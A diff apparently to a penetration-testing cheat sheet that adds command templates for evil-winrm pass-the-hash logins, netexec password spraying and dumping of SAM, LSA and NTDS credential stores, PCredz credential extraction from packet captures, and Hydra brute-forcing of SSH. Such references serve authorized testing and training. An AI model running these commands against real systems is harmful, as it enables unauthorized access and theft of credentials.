@@ -400,6 +400,7 @@ $ psql -h <IP address> -U <username> -p <password>
 
 ```
 $ evil-winrm -i <IP address> -u <username> -p <password>
+$ evil-winrm -i <IP address> -u <username> -H <passwordhash>
 ```
 
 - X11 (port 6000)
@@ -773,6 +774,22 @@ $ cewl https://www.example.com -d 4 -m 6 --lowercase -w example.wordlist
 $ ./username-anarchy -i listoffirstandlastnames.txt
 ```
 
+- Netexec
+
+```
+$ netexec winrm <IP address> -u usernames.txt -p passwords.txt
+$ netexec smb <IP address> -u <username> -p <password> --shares
+$ netexec smb <IP address> --local-auth -u <username> -p <password> --sam
+$ netexec smb <IP address> --local-auth -u <username> -p <password> --lsa
+$ netexec smb <IP address> -u <username> -p <password> --ntds
+```
+
+- PCredz
+
+```
+$ ./Pcredz -f demo.pcapng -t -v
+```
+
 - HashID
 
 ```
@@ -789,7 +806,9 @@ $ john --show hashes.txt
 - Hydra
 
 ```
-$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
+$ hydra -l '<username>' -p '<password>' <IP address> ssh
+$ hydra -L <usernames.txt> -P <passwords.txt> ssh://<IP address>
+$ hydra -C <user_pass.txt> ssh://<IP address>
 ```
 
 - Zip2john
